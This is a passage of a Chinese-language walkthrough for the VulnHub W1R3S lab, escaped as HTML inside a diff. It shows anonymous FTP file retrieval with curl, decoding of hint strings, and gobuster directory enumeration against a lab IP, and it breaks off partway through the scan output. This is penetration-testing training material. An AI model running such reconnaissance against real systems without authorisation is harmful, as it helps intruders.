+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ftp ftp &lt;span class="m"&gt;138&lt;/span&gt; Jan &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; worktodo.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ curl -s ftp://anonymous:anonymous@10.10.10.104/docs/worktodo.txt -o worktodo.txt &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; cat worktodo.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;一开始以为是俄文，不过又发现这是垂直颠倒文字和水平颠倒文字，可去搜索搜索引擎去搜索&lt;code&gt;文字倒置工具&lt;/code&gt;辅助查看&lt;/p&gt;
+&lt;p&gt;先把全部文字垂直倒置，再看倒置的下一行方向发现文字是水平颠倒的，最后再单独把这行给矫正，最后得到&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;I don&amp;#39;t think this is the way to root!
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;....we have a lot of work to do, stop playing around....
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;还剩一个目录&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ &lt;span class="k"&gt;for&lt;/span&gt; f in &lt;span class="m"&gt;01&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt; 03&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;===== &lt;/span&gt;&lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="s2"&gt;.txt =====&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; curl -s ftp://anonymous:anonymous@10.10.10.104/content/&lt;span class="nv"&gt;$f&lt;/span&gt;.txt&lt;span class="p"&gt;;&lt;/span&gt; echo&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;=====&lt;/span&gt; 01.txt &lt;span class="o"&gt;=====&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;New FTP Server For W1R3S.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;=====&lt;/span&gt; 02.txt &lt;span class="o"&gt;=====&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;01ec2d8fc11c493b25029fb1f47f39ce
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;############################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;=====&lt;/span&gt; 03.txt &lt;span class="o"&gt;=====&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;___________.__ __ __ ______________________ _________ .__ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="se"&gt;\_&lt;/span&gt;_ ___/&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;__ ____ / &lt;span class="se"&gt;\ &lt;/span&gt; / &lt;span class="se"&gt;\/&lt;/span&gt;_ &lt;span class="se"&gt;\_&lt;/span&gt;_____ &lt;span class="se"&gt;\_&lt;/span&gt;____ &lt;span class="se"&gt;\ &lt;/span&gt;/ _____/ &lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt; ____ ____ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt;/ __ &lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="se"&gt;\/\/&lt;/span&gt; / &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; _/ _&lt;span class="o"&gt;(&lt;/span&gt;__ &amp;lt; &lt;span class="se"&gt;\_&lt;/span&gt;____ &lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;/ &lt;span class="se"&gt;\_&lt;/span&gt;/ ___&lt;span class="se"&gt;\ &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; Y &lt;span class="se"&gt;\ &lt;/span&gt; ___/ &lt;span class="se"&gt;\ &lt;/span&gt; / &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\ &lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt;__ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt;____&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;___&lt;span class="p"&gt;|&lt;/span&gt; /&lt;span class="se"&gt;\_&lt;/span&gt;__ &amp;gt; &lt;span class="se"&gt;\_&lt;/span&gt;_/&lt;span class="se"&gt;\ &lt;/span&gt; / &lt;span class="p"&gt;|&lt;/span&gt;___&lt;span class="o"&gt;||&lt;/span&gt;____&lt;span class="p"&gt;|&lt;/span&gt;_ /______ /_______ / /&lt;span class="se"&gt;\ &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt;___&lt;span class="p"&gt;|&lt;/span&gt; /&lt;span class="se"&gt;\_&lt;/span&gt;__ &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; &lt;span class="se"&gt;\/&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;先对这个相对需要基础的shell命令做个解释&lt;/p&gt;
+&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;&lt;code&gt;for f in 01 02 03&lt;/code&gt;&lt;/th&gt;
+ &lt;th&gt;Shell 循环&lt;/th&gt;
+ &lt;th&gt;依次把变量 f 赋值为 01、02、03&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;do ... done&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;Shell 语法&lt;/td&gt;
+ &lt;td&gt;循环体开始和结束&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;echo &amp;quot;===== $f.txt =====&amp;quot;&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;&lt;code&gt;$f&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;展开变量 f，打印文件名作为分隔标题&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;curl&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;命令&lt;/td&gt;
+ &lt;td&gt;从 FTP 读取文件内容并输出到终端&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;-s&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;curl 选项&lt;/td&gt;
+ &lt;td&gt;静默模式，不显示进度条和统计信息&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;ftp://anonymous:anonymous@10.10.10.104/content/$f.txt&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;FTP URL&lt;/td&gt;
+ &lt;td&gt;使用匿名账号 anonymous、密码 anonymous 登录，读取 /content/ 下对应文件&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;echo&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;Shell 命令&lt;/td&gt;
+ &lt;td&gt;输出一个空行，用于分隔不同文件内容&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;值得注意是 W1R3S.inc 这个ftp服务在这&lt;/p&gt;
+&lt;p&gt;还有两个字符 &lt;code&gt;01ec2d8fc11c493b25029fb1f47f39ce&lt;/code&gt; &lt;code&gt;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&lt;/code&gt; 根据特征识别为 md5 和 base64&lt;/p&gt;
+&lt;p&gt;最下面的ASCII字符是W1R3S.inc&lt;/p&gt;
+&lt;p&gt;然后把上两个字符解码和查询为&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;This is not a password&lt;/code&gt; 可在&lt;code&gt;https://www.somd5.com/&lt;/code&gt; 查询得知&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;It is easy, but not that easy..&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="web服务探测"&gt;Web服务探测
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ gobuster dir -u http://10.10.10.104 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t &lt;span class="nv"&gt;50&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Gobuster v3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;by OJ Reeves &lt;span class="o"&gt;(&lt;/span&gt;@TheColonial&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class="o"&gt;(&lt;/span&gt;@firefart&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Url: http://10.10.10.104
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Method: GET
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Threads: &lt;span class="m"&gt;50&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Wordlist: /usr/share/wordlists/dirb/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Negative Status codes: &lt;span class="m"&gt;404&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; User Agent: gobuster/3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Extensions: html,txt,php
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Timeout: &lt;span class="nv"&gt;10s&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting gobuster in directory enumeration &lt;span class="nv"&gt;mode&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htpasswd.txt &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 300&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htaccess.php &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 300&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htaccess.txt &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 300&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htpasswd &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 296&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htpasswd.php &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 300&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htpasswd.html &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 301&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;administrator &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 320&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.hta.php &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 295&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htaccess &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 296&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htaccess.html &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 301&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.hta &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 291&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.hta.html &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 296&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.hta.txt &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 295&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;index.html &lt;span class="o"&gt;(&lt;/span&gt;Status: 200&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 11321&lt;span class="o"&gt;]&lt;/span&gt;
